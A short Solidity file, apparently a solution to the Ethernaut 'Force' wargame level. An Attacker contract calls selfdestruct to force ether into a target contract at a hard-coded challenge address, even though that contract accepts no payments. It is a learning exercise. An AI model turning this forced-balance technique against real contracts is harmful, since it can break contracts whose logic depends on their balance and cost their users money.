// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {
  /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}

contract Attacker {
  Force public vulnerableContract = Force(0x366d2039FEeD7B2436F238e4e564D1448e5Bf252); // ethernaut vulnerable contract

  function attack() external payable {
    address payable addr = payable(address(vulnerableContract));
    selfdestruct(addr);
  }
}